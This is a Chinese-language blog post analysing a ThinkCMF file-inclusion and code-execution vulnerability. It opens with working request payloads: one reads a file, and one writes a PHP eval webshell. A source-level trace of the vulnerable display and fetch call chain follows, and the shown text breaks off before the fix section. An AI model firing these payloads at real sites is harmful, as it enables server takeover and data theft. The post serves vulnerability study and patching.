<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>ThinkCMF框架任意内容包含漏洞分析 - LionTree</title>
  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=漏洞分析,php>
  
  
  
    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">LionTree</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/summary" class="menu-item-link">Summary</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
        <li class="menu-item">
          <a href="/atom.xml" class="menu-item-link">RSS</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">ThinkCMF框架任意内容包含漏洞分析</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-display方法"><span class="toc-text">1.display方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-fetch方法"><span class="toc-text">2.fetch方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-第一次执行payload2，或者清除了ThinkCMF的缓存"><span class="toc-text">1.第一次执行payload2，或者清除了ThinkCMF的缓存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-之前执行了payload2-缓存文件已经存在"><span class="toc-text">2.之前执行了payload2,缓存文件已经存在</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修补方法"><span class="toc-text">修补方法</span></a></li></ol>

  <div class="post-content">
    <ul>
<li><p>ThinkCMF基于thinkphp框架，是一款支持Swoole的开源内容管理框架</p>
</li>
<li><p>影响版本</p>
<blockquote>
<p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2<br>ThinkCMF X2.2.3</p>
</blockquote>
</li>
<li><p>漏洞危害:</p>
<ol>
<li>读取敏感文件内容</li>
<li>执行任意php代码</li>
</ol>
</li>
</ul>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ol>
<li>读取README.md文件内容<blockquote>
<p>?a=display&amp;templateFile=README.md</p>
</blockquote>
</li>
<li>写一个名为shell.php的webshell<blockquote>
<p>?a=fetch<br>&amp;templateFile=public/index<br>&amp;prefix=’’<br>&amp;content=%3C%3Fphp%20file_put_contents%28%27shell.php%27%2C%27%3C%3Fphp%20eval%28%24_POST%5B%22pass%22%5D%29%3B%3F%3E%27%29%20%3F%3E</p>
</blockquote>
</li>
</ol>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul>
<li>在thinkphp中，可以通过特殊的get参数来访问控制器和对应的操作(也就是控制器的方法)<br>比如?c=Blog&amp;a=read&amp;id=5会调用BlogController这个控制器类的read方法,并传递参数id=5</li>
<li>ThinkCMF框架默认的参数名和Thinkphp默认的不同,在/application/Common/Conf/config.php中可以看到<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'VAR_MODULE'</span>            =&gt;  <span class="string">'g'</span>,     <span class="comment">// 默认模块获取变量</span></span><br><span class="line"><span class="string">'VAR_CONTROLLER'</span>        =&gt;  <span class="string">'m'</span>,    <span class="comment">// 默认控制器获取变量</span></span><br><span class="line"><span class="string">'VAR_ACTION'</span>            =&gt;  <span class="string">'a'</span>,    <span class="comment">// 默认操作获取变量</span></span><br></pre></td></tr></table></figure>
g为模块(也就是application目录下不同的应用)，m为控制器，a为操作</li>
<li>因此我们可以通过传递get参数调用display和fetch方法，并传递相应的参数给它们。可以发现exp只制定了操作，没有指定模块和控制器,这是因为ThinkCMF设置了默认的模块和控制器，同样在/application/Common/Conf/config.php可以看到<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DEFAULT_MODULE'</span>        =&gt;  <span class="string">'Portal'</span>,  <span class="comment">// 默认模块</span></span><br><span class="line"><span class="string">'DEFAULT_CONTROLLER'</span>    =&gt;  <span class="string">'Index'</span>, <span class="comment">// 默认控制器名称</span></span><br><span class="line"><span class="string">'DEFAULT_ACTION'</span>        =&gt;  <span class="string">'index'</span>, <span class="comment">// 默认操作名称</span></span><br></pre></td></tr></table></figure></li>
<li>因此两个exp调用的是Portal模块，Index控制器下的两个操作display和fetch</li>
<li>Index 控制器并没有display和fetch这两个操作<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//首页 小夏是老猫除外最帅的男人了</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;display(<span class="string">":index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>但是IndexController的父类HomebaseController存在public的方法display和fetch方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加载模板和页面输出 可以返回输出内容</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $templateFile 模板文件名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $charset 模板输出字符集</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $contentType 输出类型</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $content 模板输出内容</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::display(<span class="keyword">$this</span>-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 获取输出页面内容</span></span><br><span class="line"><span class="comment">	 * 调用内置的模板引擎fetch方法，</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $templateFile 指定要调用的模板文件</span></span><br><span class="line"><span class="comment">	 * 默认为空 由系统自动定位模板文件</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $content 模板输出内容</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $prefix 模板缓存前缀*</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">	    $templateFile = <span class="keyword">empty</span>($content)?<span class="keyword">$this</span>-&gt;parseTemplate($templateFile):<span class="string">''</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::fetch($templateFile,$content,$prefix);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
<li>漏洞的根源就是这两个方法被设为了public，可以直接去访问这两方法，并向其传递参数</li>
</ul>
<h3 id="1-display方法"><a href="#1-display方法" class="headerlink" title="1.display方法"></a>1.display方法</h3><p>这个时候payload为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=display&amp;templateFile=README.md</span><br></pre></td></tr></table></figure>
<p>也就是只向display方法传递了templateFile参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加载模板和页面输出 可以返回输出内容</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $templateFile 模板文件名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $charset 模板输出字符集</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $contentType 输出类型</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $content 模板输出内容</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::display(<span class="keyword">$this</span>-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里先用parseTemplate去定位模板文件，然后调用父类的display方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile=<span class="string">''</span>,$charset=<span class="string">''</span>,$contentType=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;display($templateFile,$charset,$contentType,$content,$prefix);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>又会调用一个display方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile=<span class="string">''</span>,$charset=<span class="string">''</span>,$contentType=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        G(<span class="string">'viewStartTime'</span>);</span><br><span class="line">        <span class="comment">// 视图开始标签</span></span><br><span class="line">        Hook::listen(<span class="string">'view_begin'</span>,$templateFile);</span><br><span class="line">        <span class="comment">// 解析并获取模板内容</span></span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line">        <span class="comment">// 输出模板内容</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($content,$charset,$contentType);</span><br><span class="line">        <span class="comment">// 视图结束标签</span></span><br><span class="line">        Hook::listen(<span class="string">'view_end'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>跟进fetch方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析和获取模板内容 用于输出</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $templateFile 模板文件名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content 模板输出内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $prefix 模板缓存前缀</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($content)) &#123;</span><br><span class="line">            $templateFile   =   <span class="keyword">$this</span>-&gt;parseTemplate($templateFile);</span><br><span class="line">            <span class="comment">// 模板文件不存在直接返回</span></span><br><span class="line">            <span class="keyword">if</span>(!is_file($templateFile)) E(L(<span class="string">'_TEMPLATE_NOT_EXIST_'</span>).<span class="string">':'</span>.$templateFile);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            defined(<span class="string">'THEME_PATH'</span>) <span class="keyword">or</span>    define(<span class="string">'THEME_PATH'</span>, <span class="keyword">$this</span>-&gt;getThemePath());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 页面缓存</span></span><br><span class="line">        ob_start();</span><br><span class="line">        ob_implicit_flush(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'php'</span> == strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>))) &#123; <span class="comment">// 使用PHP原生模板</span></span><br><span class="line">            $_content   =   $content;</span><br><span class="line">            <span class="comment">// 模板阵列变量分解成为独立变量</span></span><br><span class="line">            extract(<span class="keyword">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">            <span class="comment">// 直接载入PHP模板</span></span><br><span class="line">            <span class="keyword">empty</span>($_content)?<span class="keyword">include</span> $templateFile:<span class="keyword">eval</span>(<span class="string">'?&gt;'</span>.$_content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 视图解析标签</span></span><br><span class="line">            $params = <span class="keyword">array</span>(<span class="string">'var'</span>=&gt;<span class="keyword">$this</span>-&gt;tVar,<span class="string">'file'</span>=&gt;$templateFile,<span class="string">'content'</span>=&gt;$content,<span class="string">'prefix'</span>=&gt;$prefix);</span><br><span class="line">            Hook::listen(<span class="string">'view_parse'</span>,$params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取并清空缓存</span></span><br><span class="line">        $content = ob_get_clean();</span><br><span class="line">        <span class="comment">// 内容过滤标签</span></span><br><span class="line">        Hook::listen(<span class="string">'view_filter'</span>,$content);</span><br><span class="line">        <span class="comment">// 输出模板文件</span></span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><code>empty($_content)?include $templateFile:eval(&#39;?&gt;&#39;.$_content);</code>这段看起来可以代码执行，但if判断为假且条件不可控制</li>
<li>跟进Hook类的listen方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 监听标签的插件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $tag 标签名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $params 传入参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">($tag, &amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">self</span>::$tags[$tag])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(APP_DEBUG) &#123;</span><br><span class="line">                G($tag.<span class="string">'Start'</span>);</span><br><span class="line">                trace(<span class="string">'[ '</span>.$tag.<span class="string">' ] --START--'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">self</span>::$tags[$tag] <span class="keyword">as</span> $name) &#123;</span><br><span class="line">                APP_DEBUG &amp;&amp; G($name.<span class="string">'_start'</span>);</span><br><span class="line">                $result =   <span class="keyword">self</span>::exec($name, $tag,$params);</span><br><span class="line">                <span class="keyword">if</span>(APP_DEBUG)&#123;</span><br><span class="line">                    G($name.<span class="string">'_end'</span>);</span><br><span class="line">                    trace(<span class="string">'Run '</span>.$name.<span class="string">' [ RunTime:'</span>.G($name.<span class="string">'_start'</span>,$name.<span class="string">'_end'</span>,<span class="number">6</span>).<span class="string">'s ]'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">                    <span class="comment">// 如果返回false 则中断插件执行</span></span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(APP_DEBUG) &#123; <span class="comment">// 记录行为的执行日志</span></span><br><span class="line">                trace(<span class="string">'[ '</span>.$tag.<span class="string">' ] --END-- [ RunTime:'</span>.G($tag.<span class="string">'Start'</span>,$tag.<span class="string">'End'</span>,<span class="number">6</span>).<span class="string">'s ]'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>发现执行了一个叫做exec的静态方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行某个插件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name 插件名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $tag 方法名（标签名）     </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Mixed $params 传入的参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($name, $tag,&amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">'D:/a.txt'</span>,$name.<span class="string">' '</span>.$params[<span class="string">'content'</span>].<span class="string">"\n"</span>,FILE_APPEND);</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'Behavior'</span> == substr($name,<span class="number">-8</span>) )&#123;</span><br><span class="line">            <span class="comment">// 行为扩展必须用run入口方法</span></span><br><span class="line">        	$class = $name;</span><br><span class="line">            $tag    =   <span class="string">'run'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        	$class   =  <span class="string">"plugins\\&#123;$name&#125;\\&#123;$name&#125;Plugin"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(class_exists($class))&#123; <span class="comment">//ThinkCMF NOTE 插件或者行为存在时才执行</span></span><br><span class="line">        	$addon   = <span class="keyword">new</span> $class();</span><br><span class="line">        	<span class="keyword">return</span> $addon-&gt;$tag($params);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>调试下发现最后一句<code>return $addon-&gt;$tag($params);</code>调用了Behavior\ParseTemplateBehavior类的run方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 行为扩展的执行入口必须是run</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(&amp;$_data)</span></span>&#123;</span><br><span class="line">       $engine             =   strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>));</span><br><span class="line">       $_content           =   <span class="keyword">empty</span>($_data[<span class="string">'content'</span>])?$_data[<span class="string">'file'</span>]:$_data[<span class="string">'content'</span>];</span><br><span class="line">       $_data[<span class="string">'prefix'</span>]    =   !<span class="keyword">empty</span>($_data[<span class="string">'prefix'</span>])?$_data[<span class="string">'prefix'</span>]:C(<span class="string">'TMPL_CACHE_PREFIX'</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="string">'think'</span>==$engine)&#123; <span class="comment">// 采用Think模板引擎</span></span><br><span class="line">           <span class="keyword">if</span>((!<span class="keyword">empty</span>($_data[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;checkContentCache($_data[<span class="string">'content'</span>],$_data[<span class="string">'prefix'</span>])) </span><br><span class="line">               ||  <span class="keyword">$this</span>-&gt;checkCache($_data[<span class="string">'file'</span>],$_data[<span class="string">'prefix'</span>])) &#123; <span class="comment">// 缓存有效</span></span><br><span class="line">               <span class="comment">//载入模版缓存文件</span></span><br><span class="line">               Storage::load(C(<span class="string">'CACHE_PATH'</span>).$_data[<span class="string">'prefix'</span>].md5($_content).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>),$_data[<span class="string">'var'</span>]);</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               $tpl = Think::instance(<span class="string">'Think\\Template'</span>);</span><br><span class="line">               <span class="comment">// 编译并加载模板文件</span></span><br><span class="line">               $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>],$_data[<span class="string">'prefix'</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="comment">// 调用第三方模板引擎解析和输出</span></span><br><span class="line">           <span class="keyword">if</span>(strpos($engine,<span class="string">'\\'</span>))&#123;</span><br><span class="line">               $class  =   $engine;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               $class   =  <span class="string">'Think\\Template\\Driver\\'</span>.ucwords($engine); </span><br><span class="line">           &#125;            </span><br><span class="line">           <span class="keyword">if</span>(class_exists($class)) &#123;</span><br><span class="line">               $tpl   =  <span class="keyword">new</span> $class;</span><br><span class="line">               $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>]);</span><br><span class="line">           &#125;<span class="keyword">else</span> &#123;  <span class="comment">// 类没有定义</span></span><br><span class="line">               E(L(<span class="string">'_NOT_SUPPORT_'</span>).<span class="string">': '</span> . $class);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li>会执行下面这段<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$tpl = Think::instance(<span class="string">'Think\\Template'</span>);</span><br><span class="line">                <span class="comment">// 编译并加载模板文件</span></span><br><span class="line">                $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>],$_data[<span class="string">'prefix'</span>]);</span><br></pre></td></tr></table></figure></li>
<li>调用Think\Template类的fetch方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载模板</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $templateFile 模板文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array  $templateVar 模板变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $prefix 模板标识前缀</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile,$templateVar,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tVar         =   $templateVar;</span><br><span class="line">        $templateCacheFile  =   <span class="keyword">$this</span>-&gt;loadTemplate($templateFile,$prefix);</span><br><span class="line">        Storage::load($templateCacheFile,<span class="keyword">$this</span>-&gt;tVar,<span class="keyword">null</span>,<span class="string">'tpl'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
